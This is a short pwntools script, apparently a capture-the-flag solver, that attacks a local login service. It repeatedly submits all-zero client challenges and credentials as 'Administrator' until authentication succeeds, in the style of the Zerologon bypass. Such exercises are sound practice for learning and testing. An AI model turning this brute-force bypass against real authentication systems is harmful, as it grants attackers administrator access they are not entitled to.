from pwn import *


conn = remote("127.0.0.1", 9999)

for _ in range(0x1337):
    conn.sendlineafter(b"> ", b"1")

    conn.sendlineafter(b"client challenge: ", b"0"*16)
    conn.sendlineafter(b"username: ", b"Administrator")
    conn.sendlineafter(b"client credential: ", b"0"*16)
    recv = conn.recvline()
    if recv != b"Login failed!\n":
        print(conn.recvline())
        conn.sendlineafter(b"> ", b"3")
        break

conn.close()